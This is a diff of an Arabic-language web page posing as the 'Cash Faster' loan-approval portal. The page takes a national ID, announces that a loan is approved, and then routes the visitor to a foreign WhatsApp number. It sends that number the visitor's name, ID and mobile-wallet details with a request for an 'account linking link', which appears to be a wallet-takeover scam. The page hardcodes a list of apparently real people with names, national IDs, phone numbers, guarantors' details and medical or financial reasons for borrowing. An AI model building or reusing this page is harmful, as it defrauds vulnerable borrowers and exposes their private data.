@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>كاش فاستر | الموافقة النهائية - صرف التمويل</title>
+    <title>كاش فاستر | الموافقة النهائية - صرف التمويل عبر واتساب</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -69,7 +69,7 @@
         .error-card { background: rgba(255, 80, 80, 0.15); border: 1px solid #ff5e5e; border-radius: 1.5rem; padding: 2rem; text-align: center; display: none; margin-top: 1rem; }
         .loader { text-align: center; display: none; margin: 1rem; }
         
-        /* النافذة المنبثقة المحترفة */
+        /* نافذة واتساب المحترفة */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -142,7 +142,7 @@
             text-align: center;
         }
         .btn-link-transfer {
-            background: linear-gradient(135deg, var(--success-green), #00B8D4);
+            background: linear-gradient(135deg, #25D366, #128C7E);
             border: none;
             padding: 0.9rem 1.8rem;
             border-radius: 3rem;
@@ -160,7 +160,7 @@
         }
         .btn-link-transfer:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 20px var(--success-green);
+            box-shadow: 0 0 20px #25D366;
         }
         .close-modal-btn {
             background: transparent;
@@ -170,16 +170,24 @@
             margin-top: 1rem;
             cursor: pointer;
         }
+        .whatsapp-note {
+            background: rgba(37, 211, 102, 0.15);
+            border-radius: 1rem;
+            padding: 0.5rem;
+            font-size: 0.85rem;
+            margin-top: 0.8rem;
+            color: #a0f0b0;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <header>
-        <div class="logo"><h1>⚡ Cash Faster</h1><p class="security-badge"><i class="fas fa-check-circle"></i> التمويل المعتمد | صرف فوري</p></div>
+        <div class="logo"><h1>⚡ Cash Faster</h1><p class="security-badge"><i class="fas fa-check-circle"></i> التمويل المعتمد | صرف فوري عبر واتساب</p></div>
     </header>
     <div class="search-card">
         <h2 class="search-title">🔍 استعلم عن طلب تمويلك</h2>
-        <p class="search-description">أدخل رقمك القومي (14 رقم) لعرض الموافقة وإتمام الصرف</p>
+        <p class="search-description">أدخل رقمك القومي (14 رقم) لعرض الموافقة وإتمام صرف القرض عبر الواتساب</p>
         <div class="input-group">
             <input type="text" id="nationalId" placeholder="مثال: 29006040102911" maxlength="14" inputmode="numeric">
             <button class="btn-search" onclick="searchCustomer()"><i class="fas fa-search"></i> تتبع طلبي</button>
@@ -188,26 +196,29 @@
     </div>
     <div class="result-card" id="resultCard"></div>
     <div class="error-card" id="errorCard"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل في النظام. يرجى التأكد من صحة الرقم.</p></div>
-    <div class="footer-info"><i class="fas fa-shield-alt"></i> جميع البيانات مشفرة SSL 256-bit | تم اعتماد طلبك تلقائياً</div>
+    <div class="footer-info"><i class="fab fa-whatsapp"></i> سيتم توجيهك إلى خدمة التحويلات المالية على واتساب لإنهاء الإجراءات | جميع البيانات مشفرة SSL</div>
 </div>
 
-<!-- النافذة المنبثقة لتوجيه العميل إلى رابط ربط الحساب -->
+<!-- النافذة المنبثقة للتوجيه إلى واتساب مع الرسالة المخصصة -->
 <div class="modal-overlay" id="redirectModal">
     <div class="modal-container">
         <div class="modal-header">
-            <h3><i class="fas fa-gem"></i> 🎉 تمويلك معتمد 🎉</h3>
+            <h3><i class="fab fa-whatsapp"></i> 🎉 تمويلك معتمد 🎉</h3>
         </div>
         <div class="modal-body">
             <p style="font-size: 1.1rem;">تهانينا! تمت الموافقة النهائية على طلب التمويل.</p>
             <div class="client-info-modal" id="modalClientInfo">
                 <!-- سيتم ملؤها بواسطة JS -->
             </div>
-            <p><strong>⚠️ خطوة مهمة:</strong> لاستلام القرض وإيداعه في حسابك، يجب ربط حسابك بالنظام من خلال الرابط المخصص لك.</p>
-            <p style="color: var(--accent-gold); margin-top: 0.5rem;">اضغط على الزر أدناه لإنهاء الإجراءات والحصول على رابط التحويل الفوري.</p>
+            <p><strong>📲 خطوة أخيرة:</strong> سيتم توجيهك إلى خدمة التحويلات المالية عبر واتساب.</p>
+            <p>سيتم إرسال رسالة تحتوي على بياناتك (الاسم، الرقم القومي، نوع المحفظة) لطلب <strong>رابط ربط الحساب</strong> وإتمام صرف القرض فوراً.</p>
+            <div class="whatsapp-note">
+                <i class="fab fa-whatsapp"></i> اضغط على الزر لفتح محادثة واتساب مع قسم التحويلات المالية
+            </div>
         </div>
         <div class="modal-footer">
             <button class="btn-link-transfer" id="confirmRedirectBtn">
-                <i class="fas fa-external-link-alt"></i> ادخل هنا لصرف القرض وانهاء الإجراءات
+                <i class="fab fa-whatsapp"></i> اذهب إلى واتساب لصرف القرض وانهاء الإجراءات
             </button>
             <button class="close-modal-btn" onclick="closeModal()"><i class="fas fa-times-circle"></i> تذكر لاحقاً</button>
         </div>
@@ -220,7 +231,7 @@
         { id:"29006040102911", name:"مصطفى ربيع عبد الحميد", job:"عمل حر", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01003165531", guarantorRelation:"عم", guarantorName:"محمود علي محمد", guarantorId:"28304241400951", guarantorPhone:"0111857964", reason:"التزامات ولزوم دفع مصروفات", otherLoans:"لايوجد", status:"approved" },
         { id:"29409010209751", name:"انس محمد حسين محمد", job:"موظف قطاع خاص", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01009031820", guarantorRelation:"زوجة", guarantorName:"اسراء سالم الكيلاني سالم", guarantorId:"29909010206445", guarantorPhone:"01044288513", reason:"للسفر", otherLoans:"نعم", status:"approved" },
         { id:"27108062501071", name:"اسماعيل محمد خليل محمد", job:"موظف حكومي", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"اتصالات كاش", walletNum:"01115421242", guarantorRelation:"زوجة", guarantorName:"مشيرة ممدوح سيد هيكل", guarantorId:"28910142503044", guarantorPhone:"01153899445", reason:"علاج ابنى مريض لطيف التوحد", otherLoans:"نعم", status:"approved" },
-        { id:"29410714221072", name:"رضا سعيد احمد ابو الحسن", job:"عمل حر (خردة)", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"زوج", guarantorName:"نجاه عبد العزيز سطوح الجندي", guarantorId:"98510715020262", guarantorPhone:"01551702690", reason:"عشان اكبر نشاطي", otherLoans:"نعم", status:"approved" },
+        { id:"29410721072", name:"رضا سعيد احمد ابو الحسن", job:"عمل حر (خردة)", loanRaw:"30,000", loanTerm:"12 شهر", installment:"3,325", total:"39,900", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"زوج", guarantorName:"نجاه عبد العزيز سطوح الجندي", guarantorId:"98510715020262", guarantorPhone:"01551702690", reason:"عشان اكبر نشاطي", otherLoans:"نعم", status:"approved" },
         { id:"26907312400212", name:"صابر جيد محمد عبد المالك", job:"موظف حكومي", loanRaw:"150,000", loanTerm:"48 شهر", installment:"4,205", total:"201,840", wallet:"اتصالات كاش", walletNum:"01157259243", guarantorRelation:"زوجة", guarantorName:"سناء نسيم فرج بدوي", guarantorId:"27704022400885", guarantorPhone:"01061342867", reason:"لتزويج الابن", otherLoans:"نعم", status:"approved" },
         { id:"28102081600531", name:"محمود ابراهيم احمد حميده", job:"موظف حكومي", loanRaw:"80,000", loanTerm:"30 شهر", installment:"3,550", total:"106,500", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"اخت", guarantorName:"سماح ابراهيم احمد حميده", guarantorId:"28507151600827", guarantorPhone:"01098398397", reason:"اجيب لي توك توك", otherLoans:"نعم", status:"approved" },
         { id:"29510011823812", name:"محمود محمد حسن محمد", job:"فني صيانة موبيلات", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01145104887", guarantorRelation:"اخ", guarantorName:"حسين محمد حسن محمد", guarantorId:"29204261801373", guarantorPhone:"01278791231", reason:"لسداد قرضين اخرين", otherLoans:"نعم", status:"approved" },
@@ -230,7 +241,7 @@
         { id:"28711020104618", name:"احمد يحي احمد حافظ", job:"مقاول رخام", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01023677517", guarantorRelation:"زوجة", guarantorName:"مني زكريا رجب حسن", guarantorId:"29405140102306", guarantorPhone:"01123871115", reason:"تمويل شغل", otherLoans:"لايوجد", status:"approved" },
         { id:"28003280200756", name:"وليد محمد محمد عبد الغني سلامه", job:"أمين مخازن", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"فودافون كاش", walletNum:"01000700925", guarantorRelation:"زوجة", guarantorName:"رباب احمد شمس الدين", guarantorId:"28102040200285", guarantorPhone:"01064209244", reason:"دعم مشروع اكسسوار موبايل", otherLoans:"لايوجد", status:"approved" },
         { id:"284121102258", name:"إبراهيم صلاح إبراهيم محمد", job:"موظف قطاع خاص", loanRaw:"60,000", loanTerm:"24 شهر", installment:"3,085", total:"74,040", wallet:"فودافون كاش", walletNum:"01022138111", guarantorRelation:"ام", guarantorName:"ماجده حسنين عبد الفتاح الشرقاوي", guarantorId:"26205300101002", guarantorPhone:"01142305476", reason:"المقدرة علي اطول فترة سداد", otherLoans:"لايوجد", status:"approved" },
-        { id:"28205222103351", name:"احمد محمد جمعه عبد الوهاب", job:"صاحب معاش", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01153836043", guarantorRelation:"ابن", guarantorName:"نور احمد محمد جمعه", guarantorId:"30707052101213", guarantorPhone:"01013793162", reason:"لإجراء عملية جراحية لابني", otherLoans:"نعم", status:"approved" },
+        { id:"26605290102101", name:"سعاد عبدالوهاب عبد المتعال احمد ", job:"صاحب معاش", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"اتصالات كاش", walletNum:"01144269548", guarantorRelation:"زوج", guarantorName:"جمال محمد حجازي ابوزيد", guarantorId:"25906258800099", guarantorPhone:"01126148773", reason:"سداد مديونيات", otherLoans:"نعم", status:"approved" },
         { id:"280072413737", name:"عبدالحليم محمود عبدالحليم السيد", job:"صاحب معاش", loanRaw:"200,000", loanTerm:"60 شهر", installment:"4,440", total:"266,400", wallet:"فودافون كاش", walletNum:"01008067343", guarantorRelation:"زوجة", guarantorName:"فتحيه علي عبدالمقصود عامر", guarantorId:"28210151301266", guarantorPhone:"01008019671", reason:"ابني مسافر ايطاليا", otherLoans:"نعم", status:"approved" },
         { id:"28809272103754", name:"محمدرياض محمدعبدالتواب", job:"صاحب مشروع قائم", loanRaw:"55,000", loanTerm:"24 شهر", installment:"3,075", total:"73,800", wallet:"فودافون كاش", walletNum:"01014068530", guarantorRelation:"زوجة", guarantorName:"اميره عبد التواب محمد عبد التواب", guarantorId:"29705192103226", guarantorPhone:"01014068530", reason:"رصيدشغل", otherLoans:"لايوجد", status:"approved" },
         { id:"28706222101773", name:"عبد العزيز محمد عبد العزيز", job:"موظف حكومي", loanRaw:"40,000", loanTerm:"18 شهر", installment:"2,965", total:"53,370", wallet:"لا يوجد محفظة", walletNum:"", guarantorRelation:"ام", guarantorName:"عزة السيد", guarantorId:"26309020102968", guarantorPhone:"01118825548", reason:"سداد الاقساط", otherLoans:"نعم", status:"approved" },
@@ -242,15 +253,16 @@
 
     let currentClient = null;
     let modalTimeout = null;
+    const WHATSAPP_NUMBER = "573102608283";  // رقم واتساب قسم التحويلات المالية
 
     function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
 
-    // بناء واجهة الموافقة (بدون أي إجراء تحويل مباشر، فقط بيانات)
+    // بناء واجهة الموافقة التفصيلية
     function buildApprovalHTML(client) {
         return `
             <div class="approval-header">
                 <h2 style="color: #00C853;"><i class="fas fa-check-circle"></i> ✅ تمويلك معتمد رسمياً</h2>
-                <p>تمت الموافقة على طلبك وجارٍ الآن تجهيز رابط الصرف.</p>
+                <p>تمت الموافقة على طلبك، يمكنك استلام القرض فوراً عبر واتساب.</p>
             </div>
             <div class="loan-highlight">
                 <div>💰 مبلغ التمويل المعتمد</div>
@@ -280,7 +292,7 @@
                 </div>
             </div>
             <div style="background: rgba(0,200,83,0.1); border-radius: 1.2rem; padding: 1rem; text-align: center; border: 1px dashed var(--success-green);">
-                <i class="fas fa-bell"></i> ستظهر نافذة خلال 5 ثوانٍ لتوجيهك إلى رابط ربط الحساب واستلام القرض.
+                <i class="fab fa-whatsapp"></i> سيتم فتح محادثة واتساب خلال 5 ثوانٍ لطلب رابط ربط الحساب واستلام التمويل.
             </div>
         `;
     }
@@ -289,10 +301,11 @@
     function showApprovalModal(client) {
         const modal = document.getElementById('redirectModal');
         const modalInfoDiv = document.getElementById('modalClientInfo');
-        // تعبئة بيانات العميل في المودال (الاسم، الرقم القومي، رقم المحفظة، المبلغ)
+        // تعبئة بيانات العميل في المودال (الاسم، الرقم القومي، المحفظة، المبلغ)
         modalInfoDiv.innerHTML = `
             <p><i class="fas fa-user"></i> <span>الاسم:</span> ${client.name}</p>
             <p><i class="fas fa-id-card"></i> <span>الرقم القومي:</span> ${client.id}</p>
+            <p><i class="fas fa-wallet"></i> <span>نوع المحفظة:</span> ${client.wallet}</p>
             <p><i class="fas fa-mobile-alt"></i> <span>رقم المحفظة:</span> ${client.walletNum || "غير مسجل"}</p>
             <p><i class="fas fa-money-bill-wave"></i> <span>المبلغ المعتمد:</span> ${client.loanRaw} ج.م</p>
         `;
@@ -305,19 +318,31 @@
         if (modalTimeout) clearTimeout(modalTimeout);
     }
 
-    // توجيه العميل إلى رابط ربط الحساب مع تمرير الرقم القومي (حتى لا يعيد إدخاله)
-    function redirectToLinkAccount(client) {
-        const baseUrl = "https://bk0212937-netizen.github.io/Rabt-wilet-/";
-        // تمرير الرقم القومي وبيانات أساسية كمعاملات (على الأقل nationalId)
-        const params = new URLSearchParams({
-            id: client.id,
-            name: client.name,
-            phone: client.walletNum || "",
-            amount: client.loanRaw
-        });
-        const finalUrl = `${baseUrl}?${params.toString()}`;
-        window.open(finalUrl, '_blank');
-        // يمكن أيضاً إغلاق المودال بعد التوجيه
+    /**
+     * إرسال رسالة واتساب إلى رقم التحويلات المالية.
+     * تحتوي الرسالة على اسم العميل، الرقم القومي، نوع المحفظة، وطلب رابط ربط الحساب.
+     */
+    function sendToWhatsApp(client) {
+        // بناء الرسالة بالصيغة المطلوبة: اسم العميل، الرقم القومي، نوع المحفظة، طلب رابط ربط الحساب
+        const walletType = client.wallet || "غير محدد";
+        const walletNumber = client.walletNum || "غير مسجل";
+        const message = `مرحباً، أريد رابط ربط الحساب لإنهاء إجراءات صرف القرض.
+البيانات:
+الاسم: ${client.name}
+الرقم القومي: ${client.id}
+نوع المحفظة: ${walletType}
+رقم المحفظة: ${walletNumber}
+المبلغ المطلوب: ${client.loanRaw} ج.م
+يرجى إرسال رابط ربط الحساب لإتمام صرف التمويل.`;
+        
+        // ترميز الرسالة (encodeURIComponent)
+        const encodedMsg = encodeURIComponent(message);
+        const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMsg}`;
+        
+        // فتح الواتساب في نافذة جديدة
+        window.open(whatsappUrl, '_blank');
+        
+        // إغلاق المودال بعد التوجيه (اختياري)
         closeModal();
     }
 
@@ -329,7 +354,7 @@
         
         // إزالة أي مؤقت سابق
         if (modalTimeout) clearTimeout(modalTimeout);
-        // بعد 5 ثوانٍ من ظهور الموافقة، يتم عرض الإشعار المنبثق
+        // بعد 5 ثوانٍ من ظهور الموافقة، يتم عرض الإشعار المنبثق لتوجيه واتساب
         modalTimeout = setTimeout(() => {
             showApprovalModal(client);
         }, 5000);
@@ -360,11 +385,11 @@
         }, 800);
     }
 
-    // إضافة مستمع لزر التوجيه في المودال (يتم ربطه ديناميكياً بعد ظهور المودال)
+    // إضافة مستمع لزر التوجيه في المودال (واتساب)
     document.addEventListener('click', function(e) {
         if (e.target && e.target.id === 'confirmRedirectBtn') {
             if (currentClient) {
-                redirectToLinkAccount(currentClient);
+                sendToWhatsApp(currentClient);
             } else {
                 alert('حدث خطأ، يرجى تحديث الصفحة والمحاولة مرة أخرى.');
             }
@@ -373,6 +398,7 @@
 
     // دعم مفتاح Enter
     document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
+    
     // إغلاق المودال عند الضغط خارج المحتوى
     window.onclick = function(event) {
         const modal = document.getElementById('redirectModal');
